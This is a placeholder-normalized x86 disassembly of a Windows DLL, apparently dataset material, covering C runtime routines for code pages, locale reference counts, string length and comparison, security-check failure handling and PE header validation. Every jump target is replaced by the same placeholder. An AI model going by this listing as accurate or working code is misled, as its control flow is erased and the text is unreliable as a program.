push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov eax [ esi + 0x84 ]
push edi
test eax eax
je r-xdata
mov eax [ esi + 0x88 ]
test eax eax
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0x9c ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0x78 ]
test eax eax
je r-xdata
push 0x6
pop eax
lea ebx [ esi + 0xa0 ]
lea edi [ esi + 0x1c ]
mov [ ebp + 0x8 ] eax
cmp [ eax + 0xb0 ] ebx
jne r-xdata
mov eax [ esi + 0x8c ]
sub eax 0xfe
push eax
call sub_10003622
mov eax [ esi + 0x94 ]
mov edi 0x80
sub eax edi
push eax
call sub_10003622
mov eax [ esi + 0x98 ]
sub eax edi
push eax
call sub_10003622
push [ esi + 0x88 ]
call sub_10003622
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0xc ] 0x0
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
push eax
call sub_10006636
push [ esi + 0x9c ]
call sub_10003622
pop ecx
pop ecx
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
add ebx 0x4
add edi 0x10
dec eax
mov [ ebp + 0x8 ] eax
jne r-xdata
mov eax [ edi - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ esi + 0x7c ]
test eax eax
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_10003622
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_10003622
push [ ebx ]
call sub_10003622
pop ecx
pop ecx
push [ esi + 0x78 ]
call sub_10003622
push [ esi + 0x84 ]
call sub_10003622
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_10003622
push [ esi + 0x84 ]
call sub_100064d3
pop ecx
pop ecx
push eax
call sub_10003622
pop ecx
push eax
call sub_10003622
push [ esi + 0x84 ]
call sub_100065cf
pop ecx
pop ecx
sub_10004cb0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
mov eax esi
pop esi
pop ebp
retn
push ebx
push edi
mov edi [ InterlockedDecrement@IAT ]
push esi
call edi
cmp [ esi + 0x78 ] 0x0
je r-xdata
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
push [ esi + 0x78 ]
call edi
cmp [ esi + 0x7c ] 0x0
je r-xdata
push eax
call edi
mov eax [ esi + 0x88 ]
test eax eax
je r-xdata
push [ esi + 0x7c ]
call edi
push 0x6
pop eax
lea ebx [ esi + 0x1c ]
mov [ ebp + 0x8 ] eax
push eax
call edi
cmp [ ebx - 0xc ] 0x0
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
add ebx 0x10
dec eax
mov [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebx - 0x4 ] 0x0
je r-xdata
push [ ebx ]
call edi
mov eax [ ebp + 0x8 ]
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov ecx [ esi + 0x9c ]
add ecx 0xb0
push ecx
call edi
pop edi
pop ebx
push [ ebx - 0x4 ]
call edi
mov eax [ ebp + 0x8 ]
sub_10004d4b
push 0xc
push r--data
call sub_10004750
call sub_10003390
mov esi eax
mov ecx [ rw-data ]
test [ esi + 0x70 ] ecx
je r-xdata
push 0xc
call sub_1000494d
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
lea eax [ esi + 0x6c ]
push eax
call sub_10004dc7
pop ecx
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10004dbe
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_10003390
mov esi [ eax + 0x6c ]
mov eax esi
call sub_10004795
retn
push 0x20
call sub_1000392b
sub_10004dc7
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_10004ac6
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_10004cb0
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_10004b56
pop ecx
sub_10004e30
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
mov [ esi + 0xc ] 0x0
test ecx ecx
jne r-xdata
mov eax [ ecx ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_10003390
mov edx eax
mov [ esi + 0x8 ] edx
mov ecx [ edx + 0x6c ]
mov [ esi ] ecx
mov ecx [ edx + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
test [ edx + 0x70 ] eax
jne r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ ecx + 0x70 ]
test al 0x2
jne r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ rw-data ]
test [ ecx + 0x70 ] eax
jne r-xdata
call sub_10004d4b
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or eax 0x2
mov [ ecx + 0x70 ] eax
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_10005155
mov [ esi + 0x4 ] eax
sub_10004eb8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub eax 0x3a4
je r-xdata
mov eax [ r--data ]
pop ebp
retn
sub eax 0x4
je r-xdata
mov eax [ r--data ]
pop ebp
retn
sub eax 0xd
je r-xdata
mov eax [ r--data ]
pop ebp
retn
dec eax
je r-xdata
mov eax [ r--data ]
pop ebp
retn
xor eax eax
pop ebp
retn
sub_10004ef2
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push 0x0
call sub_10004e30
mov eax [ ebp + 0x8 ]
and [ rw-data ] 0x0
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
jmp r-xdata
cmp eax 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] 0x1
mov eax [ eax + 0x4 ]
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10004f5e
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push 0x101
xor edi edi
lea esi [ ebx + 0x18 ]
push edi
push esi
call sub_10006d30
xor eax eax
movzx ecx ax
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0x21c ] edi
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0xc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov edi rw-data
add esp 0xc
sub edi ebx
mov ecx 0x101
mov al [ edi + esi ]
mov [ esi ] al
inc esi
dec ecx
jne r-xdata
lea ecx [ ebx + 0x119 ]
mov edx 0x100
mov al [ ecx + edi ]
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10004fc7
push ebp
mov ebp esp
sub esp 0x520
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
xor ebx ebx
mov edi 0x100
test eax eax
je r-xdata
push 0xffffff9f
lea edx [ esi + 0x119 ]
pop eax
sub eax edx
mov ecx ebx
mov [ ebp - 0x520 ] eax
mov eax ebx
cmp [ ebp - 0x51c ] 0x19
ja r-xdata
or [ esi + ecx + 0x19 ] 0x10
lea eax [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
lea ecx [ ebp - 0x512 ]
jmp r-xdata
mov [ edx ] bl
or [ esi + ecx + 0x19 ] 0x20
lea eax [ ecx - 0x20 ]
mov [ edx ] al
jmp r-xdata
test al al
jne r-xdata
add edx ecx
add eax edx
mov [ ebp - 0x51c ] eax
add eax 0x20
cmp eax 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10002de0
leave
retn
mov eax [ ebp - 0x520 ]
inc ecx
lea edx [ esi + 0x119 ]
cmp ecx edi
jb r-xdata
movzx edx [ ecx + 0x1 ]
movzx eax al
jmp r-xdata
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x504 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push ebx
call sub_10006ced
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0x21c ]
push ebx
call sub_10006b9f
add esp 0x40
lea eax [ ebp - 0x304 ]
push ebx
push [ esi + 0x4 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0x21c ]
push ebx
call sub_10006b9f
add esp 0x24
mov ecx ebx
cmp eax edx
jbe r-xdata
test al 0x2
je r-xdata
or [ esi + ecx + 0x19 ] 0x10
mov al [ ebp + ecx - 0x204 ]
jmp r-xdata
cmp eax edi
jae r-xdata
add ecx 0x2
mov al [ ecx ]
mov [ esi + ecx + 0x119 ] bl
or [ esi + ecx + 0x19 ] 0x20
mov al [ ebp + ecx - 0x304 ]
mov [ esi + ecx + 0x119 ] al
jmp r-xdata
mov [ ebp + eax - 0x104 ] 0x20
inc eax
movzx eax [ ebp + ecx * 2 - 0x504 ]
test al 0x1
je r-xdata
jmp r-xdata
inc ecx
cmp ecx edi
jb r-xdata
sub_10005155
push 0xc
push r--data
call sub_10004750
call sub_10003390
mov edi eax
mov ecx [ rw-data ]
test [ edi + 0x70 ] ecx
je r-xdata
push 0xd
call sub_1000494d
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100051f1
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_10004795
retn
push 0x20
call sub_1000392b
cmp esi rw-data
je r-xdata
push esi
call sub_10003622
pop ecx
sub_100051fa
push 0x10
push r--data
call sub_10004750
or edi 0xffffffff
call sub_10003390
mov ebx eax
mov [ ebp - 0x1c ] ebx
call sub_10005155
mov esi [ ebx + 0x68 ]
push [ ebp + 0x8 ]
call sub_10004ef2
pop ecx
mov [ ebp + 0x8 ] eax
cmp eax [ esi + 0x4 ]
je r-xdata
xor edi edi
push 0x220
call sub_10004672
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
call sub_10004795
retn
mov ecx 0x88
mov eax [ ebp - 0x1c ]
mov esi [ eax + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
xor esi esi
mov [ ebx ] esi
push ebx
push [ ebp + 0x8 ]
call sub_100053a8
pop ecx
pop ecx
mov edi eax
mov [ ebp + 0x8 ] edi
test edi edi
jne r-xdata
cmp edi 0xffffffff
jne r-xdata
mov eax [ ebp - 0x1c ]
push [ eax + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
mov eax [ ebp - 0x1c ]
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ eax + 0x68 ] ebx
push ebx
call [ InterlockedIncrement@IAT ]
mov eax [ ebp - 0x1c ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov ecx [ eax + 0x68 ]
cmp ecx rw-data
je r-xdata
call sub_100057e9
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_10003622
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push ecx
call sub_10003622
pop ecx
mov eax [ ebp - 0x1c ]
push 0xd
call sub_1000494d
pop ecx
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x21c ]
mov [ rw-data ] eax
mov ecx esi
mov ecx esi
mov ax [ ebx + ecx * 2 + 0xc ]
mov [ ecx * 2 + rw-data ] ax
inc ecx
jmp r-xdata
mov [ ebp - 0x20 ] esi
cmp esi 0x100
jge r-xdata
mov al [ ecx + ebx + 0x18 ]
mov [ ecx + rw-data ] al
inc ecx
jmp r-xdata
mov [ ebp - 0x20 ] ecx
cmp ecx 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov al [ esi + ebx + 0x119 ]
mov [ esi + rw-data ] al
inc esi
jmp r-xdata
mov [ ebp - 0x20 ] ecx
cmp ecx 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10005372
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
push eax
call sub_10003622
pop ecx
sub_100053a8
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
call sub_10004ef2
mov ebx eax
pop ecx
mov [ ebp - 0x20 ] ebx
test ebx ebx
jne r-xdata
push edi
xor edi edi
mov ecx edi
mov [ ebp - 0x1c ] ecx
mov eax edi
push esi
call sub_10004f5e
pop ecx
xor eax eax
jmp r-xdata
push 0x101
lea eax [ esi + 0x18 ]
push edi
push eax
call sub_10006d30
mov edx [ ebp - 0x1c ]
add esp 0xc
imul edx edx 0x30
lea eax [ edx + rw-data ]
mov [ ebp - 0x1c ] eax
inc ecx
add eax 0x30
mov [ ebp - 0x1c ] ecx
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_10002de0
leave
retn
inc edi
add eax 0x8
mov [ ebp - 0x1c ] eax
cmp edi 0x4
jb r-xdata
mov al [ ecx + 0x1 ]
test al al
je r-xdata
cmp [ eax + rw-data ] ebx
je r-xdata
cmp ebx 0xfde8
je r-xdata
cmp [ eax ] 0x0
mov ecx eax
je r-xdata
mov ebx [ ebp - 0x20 ]
push ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] 0x1
call sub_10004eb8
add esp 0x4
mov [ esi + 0x21c ] eax
push 0x6
lea ecx [ esi + 0xc ]
lea edx [ edx + rw-data ]
pop edi
mov eax [ ebp - 0x1c ]
movzx ebx [ ecx ]
movzx eax al
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
cmp ebx 0xfde9
je r-xdata
mov ax [ edx ]
mov [ ecx ] ax
lea edx [ edx + 0x2 ]
lea ecx [ ecx + 0x2 ]
dec edi
jne r-xdata
push esi
call sub_10004fc7
cmp ebx eax
jbe r-xdata
pop edi
movzx eax bx
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp ebx 0x100
jae r-xdata
add ecx 0x2
cmp [ ecx ] 0x0
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov al [ edi + rw-data ]
or [ esi + ebx + 0x19 ] al
movzx eax [ ecx + 0x1 ]
inc ebx
cmp [ rw-data ] edi
je r-xdata
push 0x101
lea eax [ esi + 0x18 ]
push edi
push eax
call sub_10006d30
mov [ esi + 0x4 ] ebx
xor ebx ebx
inc ebx
add esp 0xc
mov [ esi + 0x21c ] edi
cmp [ ebp - 0x18 ] ebx
jbe r-xdata
push esi
call sub_10004f5e
jmp r-xdata
mov [ esi + 0x8 ] edi
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
pop ecx
xor eax eax
lea eax [ esi + 0x1a ]
mov ecx 0xfe
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
push [ esi + 0x4 ]
call sub_10004eb8
add esp 0x4
mov [ esi + 0x21c ] eax
mov [ esi + 0x8 ] ebx
jmp r-xdata
movzx ecx [ eax ]
movzx edx dl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ esi + 0xc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp ecx edx
jbe r-xdata
or [ esi + ecx + 0x19 ] 0x4
inc ecx
add eax 0x2
cmp [ eax ] 0x0
jne r-xdata
sub_1000559d
push 0x3
call sub_10006f5f
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_100055fa
push 0xff
call sub_100055fa
pop ecx
pop ecx
push 0x3
call sub_10006f5f
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_100055d6
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x17
jb r-xdata
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_100055fa
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_100055d6
mov edi eax
pop ecx
test edi edi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10002de0
leave
retn
push ebx
push 0x3
call sub_10006f5f
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
test esi esi
je r-xdata
push 0x3
call sub_10006f5f
pop ecx
test eax eax
jne r-xdata
pop ebx
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor ebx ebx
mov ecx ebx
push r--data
push 0x314
push rw-data
call sub_10006e2c
add esp 0xc
xor ebx ebx
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_100058a0
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc ecx
cmp ecx 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10005b27
int3
push 0x104
push rw-data
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov esi 0x2fb
test eax eax
jne r-xdata
mov al [ edi + ecx * 2 ]
mov [ ebp + ecx - 0x1f8 ] al
cmp [ edi + ecx * 2 ] bx
je r-xdata
push rw-data
call sub_10006e88
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push esi
push rw-data
call sub_10006e2c
add esp 0xc
test eax eax
jne r-xdata
push r--data
push 0x314
mov esi rw-data
push esi
call sub_10006dc0
add esp 0xc
test eax eax
jne r-xdata
push rw-data
call sub_10006e88
lea ecx [ eax * 2 + rw-data ]
mov eax ecx
sub eax rw-data
push 0x3
sar eax 0x1
push r--data
sub esi eax
push esi
push ecx
call sub_10006ea1
add esp 0x14
test eax eax
jne r-xdata
push edi
push 0x314
push esi
call sub_10006dc0
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push esi
call sub_10006f9f
add esp 0xc
jmp r-xdata
sub_100057c8
push ebp
mov ebp esp
push esi
call sub_100057b5
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_100057fc
pop ecx
mov esi eax
call sub_100057e9
mov [ eax ] esi
pop esi
pop ebp
retn
sub_100057fc
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
mov eax [ eax * 8 + rw-data ]
pop ebp
retn
inc eax
cmp eax 0x2d
jb r-xdata
cmp ecx [ eax * 8 + rw-data ]
je r-xdata
lea eax [ ecx - 0x13 ]
cmp eax 0x11
ja r-xdata
lea eax [ ecx - 0xbc ]
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_1000583d
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_100057e9
push 0x16
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
push edi
mov edi esi
sub edi ecx
mov [ esi ] cl
pop edi
test edx edx
jne r-xdata
dec edx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ esi ] dl
call sub_100057e9
push 0x22
jmp r-xdata
mov al [ ecx ]
mov [ edi + ecx ] al
inc ecx
test al al
je r-xdata
pop esi
pop ebp
retn
pop esi
mov [ eax ] esi
call sub_10005b17
mov eax esi
sub_100058a0
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_10005930
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
or eax 0x1
retn
test al al
je r-xdata
test al al
je r-xdata
add ecx 0x1
test al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
test ah ah
je r-xdata
test ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
test al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
test ah ah
jne r-xdata
mov edi edi
sub_100059bc
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x8 ] 0xffffffff
push edi
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_10006d30
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
mov [ ebp - 0x218 ] eax
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x2d0 ] 0x10001
mov eax [ eax - 0x4 ]
mov [ ebp - 0x21c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x320 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x31c ] eax
mov eax [ ebp + 0x4 ]
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
mov edi eax
lea eax [ ebp - 0x328 ]
push eax
call sub_10004612
pop ecx
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_10004945
pop ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_10002de0
leave
retn
test edi edi
jne r-xdata
cmp [ ebp + 0x8 ] 0xffffffff
je r-xdata
push [ ebp + 0x8 ]
call sub_10004945
pop ecx
sub_10005aec
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10005b27
int3
pop ebp
jmp eax
sub_10005b27
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_100059bc
push esi
call sub_100045fd
add esp 0x10
pop esi
retn
push 0x5
pop ecx
int 0x29
sub_10005b60
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
mov ecx [ eax + 0x3c ]
add ecx eax
push esi
movzx eax [ ecx + 0x14 ]
movzx ebx [ ecx + 0x6 ]
add eax 0x18
xor edx edx
add eax ecx
push edi
test ebx ebx
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx ebx
jb r-xdata
mov ecx [ eax + 0x8 ]
add ecx esi
cmp edi ecx
jb r-xdata
mov esi [ eax + 0xc ]
cmp edi esi
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10005bb0
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_100047b0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_10005c70
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_10005b60
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10005c70
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx 0x5a4d
cmp [ eax ] cx
je r-xdata
mov ecx [ eax + 0x3c ]
add ecx eax
xor eax eax
cmp [ ecx ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
pop ebp
retn
mov edx 0x10b
cmp [ ecx + 0x18 ] dx
sete al
sub_10005ca1
push esi
push 0x4
push 0x20
call sub_10004628
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_10005cd0
push 0xc
push r--data
call sub_10004750
call sub_10003a71
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_10005d10
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10005d0a
mov eax esi
call sub_10004795
retn
sub_10005d10
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov [ ebp - 0x4 ] eax
call esi
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp ebx eax
jb r-xdata
xor eax eax
mov edi ebx
sub edi eax
lea ecx [ edi + 0x4 ]
cmp ecx 0x4
jb r-xdata
push eax
call sub_10007181
mov esi eax
lea eax [ edi + 0x4 ]
pop ecx
cmp esi eax
jae r-xdata
push [ ebp + 0x8 ]
call [ EncodePointer@IAT ]
lea ecx [ ebx + 0x4 ]
push ecx
mov [ ebx ] eax
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
